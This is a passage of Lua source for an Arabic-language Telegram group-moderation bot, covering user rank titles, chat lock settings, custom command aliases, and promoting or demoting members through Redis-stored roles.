local req = json:decode(info) if res ~= 200 then 
return false 
end 
if not req.ok then 
return false 
end 
return req 
end 
--     By Developer Faeder     -- 
function EditMsg(chat_id, message_id, text, markdown) local send_api = "https://api.telegram.org/bot"..tokenbot.."/editMessageText?chat_id="..chat_id.."&message_id="..message_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true" return GetApi(send_api)  end
--     By Developer Faeder     -- 
function pin(channel_id, message_id, disable_notification) 
tdcli_function ({ 
ID = "PinChannelMessage", 
channel_id_ = getChatId(channel_id).ID, 
message_id_ = message_id, 
disable_notification_ = disable_notification 
}, function(arg ,data)
vardump(data)
end ,nil) 
end
--     By Developer Faeder     -- 
-------- Local Renk
local renk_faeder = function(msg)
if tonumber(msg.sender_user_id_) == tonumber(1769776049) then
faeder  = "مالك السورس "
elseif is_leaderid(msg.sender_user_id_) then
faeder  = "Devil "
elseif is_sudoid(msg.sender_user_id_) then
faeder = "المطور الثانوي"
elseif is_admin(msg.sender_user_id_) then
faeder = "Legend 🎖"
elseif is_onall(msg.sender_user_id_) then
faeder = "المدير العام"
elseif is_onall(msg.sender_user_id_) then
faeder = "الادمن العام"
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
faeder = "المنشئ الاساسي"
elseif is_monsh2(msg.sender_user_id_, msg.chat_id_) then
faeder = "المنشئ"
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
faeder = "المدير"
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
faeder = "الادمن"
else
faeder = "العضو" 
end return faeder end
--     By Developer Faeder     -- 
-------- Faeder Renk
local faeder_renk = function(user_id,chat_id)
if tonumber(user_id) == tonumber(1769776049) then
faeder  = "مالك السورس"
elseif is_leaderid(user_id) then
faeder  = "Devil "
elseif is_sudoid(user_id) then
faeder = faederdx1:get(FAEDER.."bot:sudo:add"..chat_id) or "المطور الثانوي"
elseif is_admin(user_id) then
faeder = faederdx1:get(FAEDER.."bot:sudo3:add"..chat_id) or "Legend 🎖"
elseif is_onall(user_id) then
faeder = faederdx1:get(FAEDER.."bot:onall:add"..chat_id) or "المدير العام"
elseif is_moall(user_id) then
faeder = faederdx1:get(FAEDER.."bot:moall:add"..chat_id) or "الادمن العام"
elseif is_monsh(user_id,chat_id) then
faeder = faederdx1:get(FAEDER.."bot:monsh:add"..chat_id) or "المنشئ الاساسي"
elseif is_monsh2(user_id,chat_id) then
faeder = faederdx1:get(FAEDER.."bot:monsh2:add"..chat_id) or "المنشئ"
elseif is_owner(user_id,chat_id) then
faeder = faederdx1:get(FAEDER.."bot:owner:add"..chat_id) or "المدير"
elseif is_momod(user_id,chat_id) then
faeder = faederdx1:get(FAEDER.."bot:momod:add"..chat_id) or "الادمن"
elseif is_vipmem(user_id,chat_id) then
faeder = faederdx1:get(FAEDER.."bot:vepmem:add"..chat_id) or "المميز"
else
faeder = faederdx1:get(FAEDER.."bot:member:add"..chat_id) or "العضو" 
end return faeder end
--     By Developer Faeder     -- 
function dxdx(user_id,chat_id)
if is_leaderid(user_id) then
var = true  
elseif faederdx1:sismember(FAEDER..'bot:admins:', user_id) then
var = true  
elseif faederdx1:sismember(FAEDER..'bot:onall:', user_id) then
var = true  
elseif faederdx1:sismember(FAEDER..'bot:moall:', user_id) then
var = true  
elseif faederdx1:sismember(FAEDER..'bot:vpall:', user_id) then
var = true  
elseif faederdx1:sismember(FAEDER..'bot:monsh:'..chat_id, user_id) then
var = true
elseif is_monsh(chat_id, user_id) then
var = true
elseif faederdx1:sismember(FAEDER..'bot:monsh2:'..chat_id, user_id) then
var = true  
elseif faederdx1:sismember(FAEDER..'bot:owners:'..chat_id, user_id) then
var = true  
elseif faederdx1:sismember(FAEDER..'bot:momod:'..chat_id, user_id) then
var = true  
elseif faederdx1:sismember(FAEDER..'bot:vipmem:'..chat_id, user_id) then  
var = true  
else var = false end return var end
--     By Developer Faeder     -- 
function fadx(user_id,chat_id)
if is_leaderid(user_id) then
var = 'botow'  
elseif faederdx1:sismember(FAEDER..'bot:admins', user_id) then
var = 'sudo3'  
elseif faederdx1:sismember(FAEDER..'bot:monsh:'..chat_id, user_id) then
var = 'monsh'
elseif faederdx1:sismember(FAEDER..'bot:monsh2:'..chat_id, user_id) then
var = 'monsh2'
elseif faederdx1:sismember(FAEDER..'bot:owners:'..chat_id, user_id) then
var = 'owner'  
else  
var = 'No'
end return var end 
--     By Developer Faeder     -- 
local function check_filter_words(msg, value)
local hash = (FAEDER..'bot:filters:'..msg.chat_id_)
if hash then
local names = faederdx1:hkeys(hash)
local text = ''
local value = value:gsub(' ','')
for i=1, #names do
if string.match(value:lower(), names[i]:lower()) and not is_momod(msg.sender_user_id_, msg.chat_id_)then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
end end end end
--     By Developer Faeder     -- 
function getInputFile(file) 
if file:match("/") then 
infile = {ID = "InputFileLocal", 
path_ = file} 
elseif file:match("^%d+$") then 
infile = {ID = "InputFileId", 
id_ = file} 
else infile = {ID = "InputFilePersistentId", 
persistent_id_ = file} 
end 
return infile 
end
--     By Developer Faeder     -- 
function GetInputFile(file)  
local file = file or ""   
if file:match("/") then  
infile = {ID= "InputFileLocal", path_  = file}  
elseif file:match("^%d+$") then  
infile ={ID="InputFileId",id_=file}  
else infile={ID="InputFilePersistentId",persistent_id_ = file}  
end 
return infile 
end
--     By Developer Faeder     -- 
local getChat = function(chat_id, cb)
tdcli_function({ID = "GetChat", chat_id_ = chat_id}, cb or dl_cb, nil)
end
--     By Developer Faeder     -- 
local sendRequest = function(request_id, chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, callback, extra)
tdcli_function({
ID = request_id,
chat_id_ = chat_id,
reply_to_message_id_ = reply_to_message_id,
disable_notification_ = disable_notification,
from_background_ = from_background,
reply_markup_ = reply_markup,
input_message_content_ = input_message_content
}, callback or dl_cb, extra)
end
--     By Developer Faeder     -- 
local function sendVoice(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, voice, duration, waveform, caption, cb, cmd)
local input_message_content = {
ID = "InputMessageVoice",
voice_ = getInputFile(voice),
duration_ = duration or 0,
waveform_ = waveform,
caption_ = caption
}
sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
--     By Developer Faeder     -- 
local function sendAudio(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, audio, duration, waveform, caption, cb, cmd)
local input_message_content = {
ID = "InputMessageAudio",
audio_ = getInputFile(audio),
duration_ = duration or 0,
waveform_ = waveform,
caption_ = caption
}
sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
--     By Developer Faeder     -- 
local sendSticker = function(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, sticker)
local input_message_content = {
ID = "InputMessageSticker",
sticker_ = getInputFile(sticker),
width_ = 0,
height_ = 0
}
sendRequest("SendMessage", chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
--     By Developer Faeder     -- 
local function getChannelMembers(channel_id, offset, filter, limit,cb) 
tdcli_function ({ 
ID = "GetChannelMembers",
channel_id_ = getChatId(channel_id).ID,
filter_ = {ID = "ChannelMembers" .. filter},
offset_ = offset,limit_ = limit}, 
cb, nil) 
end 
--     By Developer Faeder     -- 
function addgroup(chat_id) 
faederdx1:sadd("faeder:addg"..bot_id,chat_id) 
faederdx1:set(FAEDER.."bot:enable:"..chat_id, true) 
faederdx1:sadd(FAEDER..'bot:groups',chat_id)
end 
function remgroup(chat_id) 
faederdx1:srem("faeder:addg"..bot_id,chat_id) 
faederdx1:del(FAEDER.."bot:enable:"..chat_id, true)  faederdx1:srem(FAEDER..'bot:groups',chat_id)
end
local function remlockal(chat_id)
faederdx1:del(FAEDER..'editmsg'..chat_id) faederdx1:del(FAEDER..'bot:cmds'..chat_id) faederdx1:del(FAEDER..'bot:bots:mute'..chat_id) faederdx1:del(FAEDER..'bot:bots:ban'..chat_id) faederdx1:del(FAEDER..'keed_bots'..chat_id) faederdx1:del(FAEDER..'anti-flood:'..chat_id) faederdx1:del(FAEDER..'bot:pin:mute'..chat_id) faederdx1:del(FAEDER..'bot:photo:mute'..chat_id) faederdx1:del(FAEDER..'bot:spam:mute'..chat_id) faederdx1:del(FAEDER..'bot:video:mute'..chat_id) faederdx1:del(FAEDER..'bot:document:mute'..chat_id) faederdx1:del(FAEDER..'bot:inline:mute'..chat_id) faederdx1:del(FAEDER..'markdown:lock'..chat_id) faederdx1:del(FAEDER..'bot:gifs:mute'..chat_id) faederdx1:del(FAEDER..'bot:music:mute'..chat_id) faederdx1:del(FAEDER..'bot:voice:mute'..chat_id) faederdx1:del(FAEDER..'bot:links:mute'..chat_id) faederdx1:del(FAEDER..'bot:location:mute'..chat_id) faederdx1:del(FAEDER..'tags:lock'..chat_id) faederdx1:del(FAEDER..'bot:strict'..chat_id) faederdx1:del(FAEDER..'bot:hashtag:mute'..chat_id) faederdx1:del(FAEDER..'bot:contact:mute'..chat_id) faederdx1:del(FAEDER..'bot:webpage:mute'..chat_id) faederdx1:del(FAEDER..'bot:sticker:mute'..chat_id) faederdx1:del(FAEDER..'bot:forward:mute'..chat_id)
end
local function addlockal(chat_id)
faederdx1:set(FAEDER..'editmsg'..chat_id,true) faederdx1:set(FAEDER..'bot:cmds'..chat_id,true) faederdx1:set(FAEDER..'bot:bots:mute'..chat_id,true) faederdx1:set(FAEDER..'bot:bots:ban'..chat_id,true) faederdx1:set(FAEDER..'keed_bots'..chat_id,true) faederdx1:set(FAEDER..'anti-flood:'..chat_id,true) faederdx1:set(FAEDER..'bot:pin:mute'..chat_id,true) faederdx1:set(FAEDER..'bot:inline:mute'..chat_id,true) faederdx1:set(FAEDER..'bot:photo:mute'..chat_id,true) faederdx1:set(FAEDER..'bot:spam:mute'..chat_id,true) faederdx1:set(FAEDER..'bot:video:mute'..chat_id,true) faederdx1:set(FAEDER..'bot:gifs:mute'..chat_id,true) faederdx1:set(FAEDER..'bot:music:mute'..chat_id,true) faederdx1:set(FAEDER..'bot:voice:mute'..chat_id,true) faederdx1:set(FAEDER..'bot:links:mute'..chat_id,true) faederdx1:set(FAEDER..'bot:location:mute'..chat_id,true) faederdx1:set(FAEDER..'tags:lock'..chat_id,true) faederdx1:set(FAEDER..'bot:strict'..chat_id,true) faederdx1:set(FAEDER..'bot:document:mute'..chat_id,true) faederdx1:set(FAEDER..'bot:hashtag:mute'..chat_id,true) faederdx1:set(FAEDER..'bot:contact:mute'..chat_id,true) faederdx1:set(FAEDER..'bot:webpage:mute'..chat_id,true) faederdx1:set(FAEDER..'bot:sticker:mute'..chat_id,true) faederdx1:set(FAEDER..'markdown:lock'..chat_id,true) faederdx1:set(FAEDER..'bot:forward:mute'..chat_id,true)
end
--     By Developer Faeder     -- 
function formsgg(msgs) 
local faeder = ''  
if msgs < 100 then 
faeder = "ضعيف جدا"
elseif msgs < 250 then 
faeder = "ضعيف"
elseif msgs < 500 then 
faeder = "غير متفاعل"
elseif msgs < 750 then 
faeder = "متوسط"
elseif msgs < 1000 then 
faeder = "متفاعل"
elseif msgs < 2000 then 
faeder = "قمه التفاعل"
elseif msgs < 3000 then 
faeder = "ملك التفاعل"
elseif msgs < 4000 then 
faeder = "اسطوره التفاعل"
elseif msgs < 5000 then 
faeder = "نار وشرار" 
elseif msgs < 6000 then 
faeder = "جهنم يحبيبي" 
elseif msgs < 7000 then 
faeder = "اسطططوري" 
elseif msgs < 8000 then 
faeder = "والنعم بشيخ التفاعل" 
elseif msgs < 9000 then 
faeder = "ملك القروب" 
end return faeder end
--     By Developer Faeder     -- 
function title_name(GroupID) 
tdcli_function({ID ="GetChat",chat_id_=GroupID
},function(arg,data) 
faederdx1:set(FAEDER..'bot:group:name'..GroupID,data.title_) 
end,nil) 
return faederdx1:get(FAEDER..'bot:group:name'..GroupID)  end
--     By Developer Faeder     -- 
function faedrmoned(chat_id, user_id, msg_id, text, offset, length) local tt = faederdx1:get(FAEDER..'endmsg') or '' tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = msg_id, disable_notification_ = 0, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text..'\n\n'..tt, disable_web_page_preview_ = 1, clear_draft_ = 0, entities_ = {[0]={ ID="MessageEntityMentionName", offset_=offset, length_=length, user_id_=user_id }, }, }, }, dl_cb, nil) end
--     By Developer Faeder     -- 
function faeder11(msg)
local var = true 
if faederdx1:get(FAEDER.."faeder2") then
local channel = ''..faederdx1:get(FAEDER..'faeder3')..''
local url , res = https.request('https://api.telegram.org/bot'..tokenbot..'/getchatmember?chat_id='..channel..'&user_id='..msg.sender_user_id_)
local data = json:decode(url)
if res ~= 200 or data.result.status == "left" or data.result.status == "kicked" then
var = false
faederdx(msg.chat_id_,msg.id_, 1, "*↫ لا تستطيع استخدام البوت \n↫ اشترك بقناته لتتمكن من استخدامه \n\n↫ قناة البوت* : ["..channel.."] \n", 1 , "md")
elseif data.ok then
return var
end else return var end end
--     By Developer Faeder     -- 
function tdcli_update_callback(data)
local our_id = faederdx1:get(FAEDER.."Our_ID") or 0
local api_id = faederdx1:get(FAEDER.."Bot:Api_ID") or 0
if data.ID == "UpdateNewCallbackQuery" then
local Chat_id = data.chat_id_
local Msg_id = data.message_id_
local Text = data.payload_.data_
if Text == '/UnKed' then
if faederdx1:sismember(FAEDER.."faederdx1:Un:Ked"..data.chat_id_,data.sender_user_id_) then
https.request("https://api.telegram.org/bot" .. tokenbot .. "/restrictChatMember?chat_id=" .. data.chat_id_ .. "&user_id=" .. data.sender_user_id_ .. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
faederdx1:srem(FAEDER.."faederdx1:Un:Ked"..Chat_id,data.sender_user_id_)
delete_msg(data.chat_id_, {[0] = Msg_id})  
end end end
--     By Developer Faeder     -- 
if data.ID == "UpdateNewMessage" then
local msg = data.message_
local d = data.disable_notification_
local chat = chats[msg.chat_id_]
text = data.message_.content_.text_
if text and faederdx1:get(bot_id.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
local NewCmmd = faederdx1:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
if NewCmmd then
faederdx1:del(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
faederdx1:del(bot_id.."Set:Cmd:Group:New"..msg.chat_id_)
faederdx1:srem(bot_id.."List:Cmd:Group:New"..msg.chat_id_,text)
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم مسح الامر من المجموعه ", 1, 'html')
else
faederdx(msg.chat_id_, msg.id_, 1, "↫ لا يوجد هكذا امر ", 1, 'html')
end
faederdx1:del(bot_id.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if data.message_.content_.text_ then
local NewCmmd = faederdx1:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..data.message_.content_.text_)
if NewCmmd then
data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
end end
--     By Developer Faeder     -- 
if text and faederdx1:get(bot_id.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
faederdx1:set(bot_id.."Set:Cmd:Group:New"..msg.chat_id_,text)
faederdx(msg.chat_id_, msg.id_, 1, "↫ ارسل لي الامر الجديد ", 1, 'html')
faederdx1:del(bot_id.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
faederdx1:set(bot_id.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_,"true1") 
return false
end
if text and faederdx1:get(bot_id.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_) == "true1" then
local NewCmd = faederdx1:get(bot_id.."Set:Cmd:Group:New"..msg.chat_id_)
faederdx1:set(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text,NewCmd)
faederdx1:sadd(bot_id.."List:Cmd:Group:New"..msg.chat_id_,text)
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم حفظ الامر الجديد ", 1, 'html')
faederdx1:del(bot_id.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
--     By Developer Faeder     -- 
if text == "الاوامر المضافه" and faeder11(msg) then
local list = faederdx1:smembers(bot_id.."List:Cmd:Group:New"..msg.chat_id_.."")
t = "↫ قائمه الاوامر المضافه \n         ───────────────\n"
for k,v in pairs(list) do
Cmds = faederdx1:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
if Cmds then 
t = t..""..k.."- ("..v..") « ← ("..Cmds..")\n"
else
t = t..""..k.."- ("..v..") \n"
end end 
if #list == 0 then
t = "↫ لايوجد اوامر مضافه ."
end
faederdx(msg.chat_id_, msg.id_, 1, "["..t.."]", 1, 'md')
end
--     By Developer Faeder     -- 
if text == "حذف الاوامر المضافه" or text == "مسح الاوامر المضافه" and faeder11(msg) then
local list = faederdx1:smembers(bot_id.."List:Cmd:Group:New"..msg.chat_id_)
for k,v in pairs(list) do
faederdx1:del(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
faederdx1:del(bot_id.."List:Cmd:Group:New"..msg.chat_id_)
end
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم مسح الاوامر المضافه .", 1, 'html')
end
--     By Developer Faeder     -- 
if text == "اضف امر" then
faederdx1:set(bot_id.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
faederdx(msg.chat_id_, msg.id_, 1, "↫ ارسل لي الامر القديم .", 1, 'html')
return false
end
--     By Developer Faeder     -- 
if text == "حذف امر" or text == "مسح امر" and faeder11(msg) then 
faederdx1:set(bot_id.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
faederdx(msg.chat_id_, msg.id_, 1, "↫ ارسل لي الامر الذي قمت باضافته يدويا .", 1, 'html')
return false 
end
--     By Developer Faeder     -- 
if text == "الصلاحيات" and faeder11(msg) then 
local list = faederdx1:smembers(bot_id.."Coomds"..msg.chat_id_)
if #list == 0 then
faederdx(msg.chat_id_, msg.id_, 1, "↫ لا يوجد صلاحيات مضافه .", 1, 'html')
return false
end
t = "↫ قائمه الصلاحيات المضافه \n         ───────────────\n"
for k,v in pairs(list) do
var = faederdx1:get(bot_id.."Comd:New:rt:bot:"..v..msg.chat_id_)
if var then
t = t..""..k.."- ("..v..") « ← ("..var..")\n"
else
t = t..""..k.."- ("..v..")\n"
end end
faederdx(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
--     By Developer Faeder     -- 
if text == "مسح الصلاحيات" and faeder11(msg) then
local list = faederdx1:smembers(bot_id.."Coomds"..msg.chat_id_)
for k,v in pairs(list) do
faederdx1:del(bot_id.."Comd:New:rt:bot:"..v..msg.chat_id_)
faederdx1:del(bot_id.."Coomds"..msg.chat_id_)
end
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم مسح جميع الصلاحيات .", 1, 'html')
end
--     By Developer Faeder     -- 
if text and text:match("^اضف صلاحيه (.*)$") and faeder11(msg) then 
ComdNew = text:match("^اضف صلاحيه (.*)$")
faederdx1:set(bot_id.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_,ComdNew)  
faederdx1:sadd(bot_id.."Coomds"..msg.chat_id_,ComdNew)  
faederdx1:setex(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_,200,true)  
faederdx(msg.chat_id_, msg.id_, 1, "↫ ارسل نوع الصلاحيه \n↫ { عضو - مميز - ادمن - مدير }", 1, 'html') 
end
--     By Developer Faeder     -- 
if text and text:match("^مسح صلاحيه (.*)$") or text and text:match("^حذف صلاحيه (.*)$") and faeder11(msg) then 
ComdNew = text:match("^مسح صلاحيه (.*)$") or text:match("^حذف صلاحيه (.*)$")
faederdx1:del(bot_id.."Comd:New:rt:bot:"..ComdNew..msg.chat_id_)
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم مسح الصلاحيه .", 1, 'html')
end
if faederdx1:get(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم الغاء الامر .", 1, 'html')
faederdx1:del(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
if text == "مدير" then
if not is_monsh(msg.sender_user_id_, msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, "↫ ارسل نوع الصلاحيه \n↫ { عضو - مميز - ادمن }", 1, 'html')
return false
end end
if text == "ادمن" then
if not is_owner(msg.sender_user_id_, msg.chat_id_) then 
faederdx(msg.chat_id_, msg.id_, 1, "↫ ارسل نوع الصلاحيه \n↫ { عضو - مميز }", 1, 'html')
return false
end end
if text == "مميز" then
if not is_momod(msg.sender_user_id_, msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, "↫ ارسل نوع الصلاحيه \n↫ تستطيع اضافه صلاحيه { عضو } فقط", 1, 'html')
return false
end end
if text == "مدير" or text == "ادمن" or text == "مميز" or text == "عضو" then
local textn = faederdx1:get(bot_id.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_)  
faederdx1:set(bot_id.."Comd:New:rt:bot:"..textn..msg.chat_id_,text)
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم حفظ الصلاحيه .", 1, 'html')
faederdx1:del(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end end
--     By Developer Faeder     -- 
if text and text:match("رفع (.*)") and tonumber(msg.reply_to_message_id_) > 0 and faeder11(msg) then 
local faederrt = text:match("رفع (.*)")
if faederdx1:sismember(bot_id.."Coomds"..msg.chat_id_,faederrt) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local fdrt = faederdx1:get(bot_id.."Comd:New:rt:bot:"..faederrt..msg.chat_id_)
if fdrt == "مميز" and is_momod(msg.sender_user_id_, msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ العضو ⇠ ( ['..data.first_name_..'](t.me/'..(data.username_ or 'faeder_ch')..')'..' )\n↫ *تم رفعه ( '..faederrt..' )', 1, 'md')
faederdx1:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,faederrt) 
faederdx1:sadd(FAEDER..'bot:vipmem:'..msg.chat_id_, result.sender_user_id_)
elseif fdrt == "ادمن" and is_owner(msg.sender_user_id_, msg.chat_id_) then 
faederdx(msg.chat_id_, msg.id_, 1, '↫ العضو ⇠ ( ['..data.first_name_..'](t.me/'..(data.username_ or 'faeder_ch')..')'..' )\n↫ *تم رفعه ( '..faederrt..' )', 1, 'md')
faederdx1:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,faederrt)
faederdx1:sadd(FAEDER..'bot:momod:'..msg.chat_id_, result.sender_user_id_)
elseif fdrt == "مدير" and is_monsh(msg.sender_user_id_, msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ العضو ⇠ ( ['..data.first_name_..'](t.me/'..(data.username_ or 'faeder_ch')..')'..' )\n↫ *تم رفعه ( '..faederrt..' )', 1, 'md')
faederdx1:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,faederrt)  
faederdx1:sadd(FAEDER..'bot:owners:'..msg.chat_id_, result.sender_user_id_)
elseif fdrt == "عضو" and is_momod(msg.sender_user_id_, msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ العضو ⇠ ( ['..data.first_name_..'](t.me/'..(data.username_ or 'faeder_ch')..')'..' )\n↫ *تم رفعه ( '..faederrt..' )', 1, 'md')
end end,nil) end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end end
--     By Developer Faeder     -- 
if text and text:match("تنزيل (.*)") and tonumber(msg.reply_to_message_id_) > 0 and faeder11(msg) then 
local faederrt = text:match("تنزيل (.*)")
if faederdx1:sismember(bot_id.."Coomds"..msg.chat_id_,faederrt) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local fdrt = faederdx1:get(bot_id.."Comd:New:rt:bot:"..faederrt..msg.chat_id_)
if fdrt == "مميز" and is_momod(msg.sender_user_id_, msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ العضو ⇠ ( ['..data.first_name_..'](t.me/'..(data.username_ or 'faeder_ch')..')'..' )\n↫ *تم تنزيله من ( '..faederrt..' )', 1, 'md')
faederdx1:srem(FAEDER..'bot:vipmem:'..msg.chat_id_, result.sender_user_id_)
faederdx1:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif fdrt == "ادمن" and is_owner(msg.sender_user_id_, msg.chat_id_) then 
faederdx(msg.chat_id_, msg.id_, 1, '↫ العضو ⇠ ( ['..data.first_name_..'](t.me/'..(data.username_ or 'faeder_ch')..')'..' )\n↫ *تم تنزيله من ( '..faederrt..' )', 1, 'md')
faederdx1:srem(FAEDER..'bot:momod:'..msg.chat_id_, result.sender_user_id_)
faederdx1:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif fdrt == "مدير" and is_monsh(msg.sender_user_id_, msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ العضو ⇠ ( ['..data.first_name_..'](t.me/'..(data.username_ or 'faeder_ch')..')'..' )\n↫ *تم تنزيله من ( '..faederrt..' )', 1, 'md')
faederdx1:srem(FAEDER..'bot:owners:'..msg.chat_id_, result.sender_user_id_)
faederdx1:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif fdrt == "عضو" and is_momod(msg.sender_user_id_, msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ العضو ⇠ ( ['..data.first_name_..'](t.me/'..(data.username_ or 'faeder_ch')..')'..' )\n↫ *تم تنزيله من ( '..faederrt..' )', 1, 'md')
end end,nil) end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end end
--     By Developer Faeder     -- 
if text and text:match("^رفع (.*) @(.*)") and faeder11(msg) then 
local text1 = {string.match(text, "^(رفع) (.*) @(.*)$")}
if faederdx1:sismember(bot_id.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local fdrt = faederdx1:get(bot_id.."Comd:New:rt:bot:"..text1[2]..msg.chat_id_)
if fdrt == "مميز" and is_momod(msg.sender_user_id_, msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ العضو ( ['..result.title_..'](t.me/'..(text1[3] or 'faeder_ch')..')'..' )\n↫ تم رفعه ( '..text1[2]..' )', 1, 'md')
faederdx1:sadd(FAEDER..'bot:vipmem:'..msg.chat_id_, result.id_)
faederdx1:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif fdrt == "ادمن" and is_owner(msg.sender_user_id_, msg.chat_id_) then 
faederdx(msg.chat_id_, msg.id_, 1, '↫ العضو ( ['..result.title_..'](t.me/'..(text1[3] or 'faeder_ch')..')'..' )\n↫ تم رفعه ( '..text1[2]..' )', 1, 'md')
faederdx1:sadd(FAEDER..'bot:momod:'..msg.chat_id_, result.id_)
faederdx1:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif fdrt == "مدير" and is_monsh(msg.sender_user_id_, msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ العضو ( ['..result.title_..'](t.me/'..(text1[3] or 'faeder_ch')..')'..' )\n↫ تم رفعه ( '..text1[2]..' )', 1, 'md')
faederdx1:sadd(FAEDER..'bot:owners:'..msg.chat_id_, result.id_)
faederdx1:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif fdrt == "عضو" and is_momod(msg.sender_user_id_, msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ العضو ( ['..result.title_..'](t.me/'..(text1[3] or 'faeder_ch')..')'..' )\n↫ تم رفعه ( '..text1[2]..' )', 1, 'md')
end else
info = "↫ المعرف غير صحيح"
faederdx(msg.chat_id_, msg.id_, 1, info, 1, 'html')
end end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end end
--     By Developer Faeder     -- 
if text and text:match("^تنزيل (.*) @(.*)") and faeder11(msg) then 
local text1 = {string.match(text, "^(تنزيل) (.*) @(.*)$")}
if faederdx1:sismember(bot_id.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local fdrt = faederdx1:get(bot_id.."Comd:New:rt:bot:"..text1[2]..msg.chat_id_)
if fdrt == "مميز" and is_momod(msg.sender_user_id_, msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ العضو ( ['..result.title_..'](t.me/'..(text1[3] or 'faeder_ch')..')'..' )\n↫ تم تنزيله من ( '..text1[2]..' )', 1, 'md')
faederdx1:srem(FAEDER..'bot:vipmem:'..msg.chat_id_, result.id_)
faederdx1:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif fdrt == "ادمن" and is_owner(msg.sender_user_id_, msg.chat_id_) then 
faederdx(msg.chat_id_, msg.id_, 1, '↫ العضو ( ['..result.title_..'](t.me/'..(text1[3] or 'faeder_ch')..')'..' )\n↫ تم تنزيله من ( '..text1[2]..' )', 1, 'md')
